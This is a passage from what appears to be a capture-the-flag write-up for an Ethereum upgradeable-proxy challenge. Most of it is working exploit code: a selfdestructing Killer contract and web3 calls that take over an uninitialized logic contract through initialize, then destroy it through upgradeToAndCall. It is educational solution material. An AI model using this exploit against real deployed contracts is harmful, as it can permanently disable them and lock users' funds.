we can call `initialize` on the logic contract, this would make us the `upgrader` in the logic contract and let us call `upgradeToAndCall` against a contract that selfdestructs.

```
contract Killer {
    function kill(address payable receiver) public {
        selfdestruct(receiver);
    }
}
```

```
let logicAddress = await web3.eth.getStorageAt(instance, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc');
logicAddress = '0x' + logicAddress.slice(26, logicAddress.length);

const dataInitialize = web3.eth.abi.encodeFunctionCall({
    name: 'initialize',
    type: 'function',
    inputs: []
}, []);

await web3.eth.sendTransaction({from: player, to: logicAddress, data: dataInitialize});

const dataKill = web3.eth.abi.encodeFunctionCall({
    name: 'kill',
    type: 'function',
    inputs: [{
      type: 'address',
      name: 'receiver'
    }]
}, [player]);

const dataUpgrade = web3.eth.abi.encodeFunctionCall({
    name: 'upgradeToAndCall',
    type: 'function',
    inputs: [{
      type: 'address',
      name: 'receiver'
    }, {
      type: 'bytes',
      name: 'data',
    }]
}, ['<Killer contract address>', dataKill]);

await web3.eth.sendTransaction({from: player, to: logicAddress, data: dataUpgrade});
```
